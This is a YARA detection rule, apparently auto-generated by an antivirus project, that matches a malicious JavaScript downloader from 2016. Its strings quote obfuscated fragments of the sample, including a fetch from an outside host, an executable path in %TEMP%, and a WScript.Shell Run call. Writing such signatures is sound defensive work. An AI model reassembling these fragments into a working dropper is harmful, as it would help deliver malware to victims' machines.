rule sig_20160328_1f2e943279507eb858155f0ee1eb74d6 {
  meta:
    description = "datamaliciousorder - file 20160328_1f2e943279507eb858155f0ee1eb74d6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7d944fb7b18e31eda598f1cd49616c6fb461089c6739ab15ab6961e32028296a"

  strings:
    $s1  = "function Ffjerihpqn() {return Vnwsvuq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bSBnhTGFnUGEB.exe\";};" fullword ascii
    $s2  = "Koaleq[Plwboervbj](\"GET\", \"http://rvstuintafel.com/aqp9ik\", false);" fullword ascii
    $s3  = "do {WScript[Ilivdenyu](Rlvktqa() * 11)} while (Koaleq[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Wtbofoyxj() {return ((Ndomtyowyf == true) && (Ndomtyowyf == Rhedhb)) ? 1 : Irclyogzd;};" fullword ascii
    $s5  = "function Prcvzews(Qrbyjtqt, Lysyanjgog){return Qrbyjtqt - Lysyanjgog;};" fullword ascii
    $s6  = "var Vnwsvuq = function Zpcfeiwgf() {return WScript[Cfjacme](\"WScript.Shell\");}();" fullword ascii
    $s7  = "function Deocievaa(Unxfdjc){Vnwsvuq[\"Run\"](Unxfdjc, Irclyogzd, Irclyogzd);};" fullword ascii
    $s8  = "return Prcvzews(Dbhne, Xeamtxckcd);" fullword ascii
    $s9  = "Ndomtyowyf = true; " fullword ascii
    $s10 = "function Wtcokwgnmm()" fullword ascii
    $s11 = "function Qgpvuxkz(){return Efuawsuyb;};" fullword ascii
    $s12 = "var Ndomtyowyf = false;" fullword ascii
    $s13 = "function Cbysxtf(){return Cfjacme;};" fullword ascii
    $s14 = "function Esocqr(Sxqvf) {var Eterdlgj = (1, 2, 3, 4, 5, Sxqvf); return Eterdlgj;};" fullword ascii
    $s15 = "function Rlvktqa(){return 22;};" fullword ascii
    $s16 = "var Ourrwuwojq = false;" fullword ascii
    $s17 = " while (Cmbszyrv){" fullword ascii
    $s18 = "var Rhedhb = false;" fullword ascii
    $s19 = "var Sopknspad = new this[\"Date\"]();" fullword ascii
    $s20 = "Rhedhb = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}